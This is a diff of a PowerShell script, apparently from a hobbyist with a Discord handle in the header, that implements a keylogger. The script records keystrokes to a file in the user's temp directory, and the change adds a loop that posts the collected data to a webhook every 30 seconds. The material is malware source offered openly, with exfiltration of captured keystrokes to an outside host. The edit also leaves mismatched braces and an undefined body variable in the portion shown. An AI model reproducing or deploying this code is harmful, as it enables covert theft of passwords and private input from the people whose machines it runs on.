@@ -2,8 +2,6 @@
 # Discord: syke#1166 / Syke#1166
 
 
-
-
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
@@ -32,7 +30,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 
   # attempt to log keystrokes
-  try {
+  
     while ($true) {
       Start-Sleep -Milliseconds 40
 
@@ -57,11 +55,14 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
             [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+             
+            }
              }
+             
+             Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+             Start-Sleep -Seconds 30
          }
-         }
-         }
-  }
+     }
   }
   
 
